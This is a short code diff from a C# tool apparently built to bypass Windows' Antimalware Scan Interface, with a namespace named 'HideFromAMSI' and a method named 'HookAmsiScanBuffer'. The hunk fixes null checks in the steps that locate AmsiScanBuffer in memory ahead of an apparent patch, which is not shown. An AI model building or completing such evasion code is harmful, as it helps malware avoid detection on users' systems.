@@ -107,11 +107,11 @@ namespace HideFromAMSI
         static string HookAmsiScanBuffer(IntPtr hProcess)
         {
             IntPtr dllHandle = NativeMethods.LoadLibrary("amsi.dll"); //load the amsi.dll
-            if (dllHandle == null) return "LoadLibrary error " + NativeMethods.GetLastError();
+            if (dllHandle == IntPtr.Zero) return "LoadLibrary error " + NativeMethods.GetLastError();
 
             //Get the AmsiScanBuffer function address
             IntPtr AmsiScanbufferAddr = NativeMethods.GetProcAddress(dllHandle, "AmsiScanBuffer");
-            if (AmsiScanbufferAddr == null) return "GetProcAddress error " + NativeMethods.GetLastError();
+            if (AmsiScanbufferAddr == IntPtr.Zero) return "GetProcAddress error " + NativeMethods.GetLastError();
 
 
             //uint OldProtection = (uint)Marshal.AllocHGlobal(8); //pointer to store the current AmsiScanBuffer memory protection
